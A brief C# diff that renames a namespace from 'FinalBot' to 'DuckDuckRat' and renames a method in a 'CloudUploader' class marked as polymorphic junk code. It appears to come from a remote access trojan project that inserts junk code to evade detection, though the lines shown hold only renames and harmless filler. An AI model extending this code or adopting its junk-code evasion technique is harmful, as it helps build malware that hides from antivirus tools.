@@ -4,12 +4,12 @@ using System.Net.Http;
 using System.Text.Json;
 using System.Threading.Tasks;
 
-namespace FinalBot.Modules
+namespace DuckDuckRat.Modules
 {
     public static class CloudUploader
     {
         // [POLY_JUNK_START]
-        private static void _vanguard_cloud_init() {
+        private static void _DuckDuckRat_cloud_init() {
             Random r = new Random();
             int seed = r.Next(100, 999);
             if (seed < 0) Console.WriteLine("Init:" + seed);
@@ -84,3 +84,5 @@ namespace FinalBot.Modules
         }
     }
 }
+
+
